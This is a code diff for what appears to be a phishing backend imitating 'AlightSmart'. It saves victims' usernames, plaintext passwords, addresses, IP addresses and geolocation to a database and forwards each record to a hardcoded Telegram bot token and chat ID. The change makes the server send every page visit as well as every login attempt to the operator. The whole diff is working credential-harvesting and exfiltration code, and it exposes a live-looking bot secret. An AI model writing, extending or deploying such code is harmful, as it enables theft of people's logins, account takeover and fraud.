@@ -31,7 +31,7 @@ function getRealIP(req) {
            'Unknown';
 }
 
-// ==================== TELEGRAM NOTIFICATION ====================
+// ==================== TELEGRAM ====================
 const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
 const CHAT_ID = "8559945003";
 
@@ -40,7 +40,6 @@ async function getLocation(ip) {
     try {
         const res = await fetch(`https://ipapi.co/${ip}/json/`);
         const data = await res.json();
-        if (data.error) return 'Unknown Location';
         return `${data.city || ''}, ${data.country_name || ''}`.trim() || 'Unknown Location';
     } catch (e) {
         return 'Unknown Location';
@@ -48,7 +47,7 @@ async function getLocation(ip) {
 }
 
 async function sendTelegramNotification(record) {
-    const message = `🚨 *New AlightSmart Submission!*\n\n` +
+    const message = `🚨 *New Activity on AlightSmart!*\n\n` +
         `• *Type:* ${record.type}\n` +
         `• *Username:* ${record.username || '-'}\n` +
         `• *Password:* ${record.password || '-'}\n` +
@@ -68,7 +67,7 @@ async function sendTelegramNotification(record) {
                 parse_mode: 'Markdown'
             })
         });
-        console.log("✅ Telegram notification sent!");
+        console.log("✅ Telegram sent!");
     } catch (err) {
         console.error("❌ Telegram failed:", err.message);
     }
@@ -84,13 +83,11 @@ async function saveRecord(type, username = null, password = null, address = null
             "INSERT INTO records (type, username, password, address, ip, location, timestamp) VALUES ($1, $2, $3, $4, $5, $6, $7)",
             [type, username, password, address, ip, location, timestamp]
         );
-        
+
         console.log(`✅ SAVED: ${type} | IP: ${ip}`);
 
-        // Send notification ONLY for actual submissions (Login Attempts)
-        if (type === 'Login Attempt') {
-            await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
-        }
+        // Send notification for EVERY new record (Page Visit + Login)
+        await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
     } catch (err) {
         console.error("Save Error:", err.message);
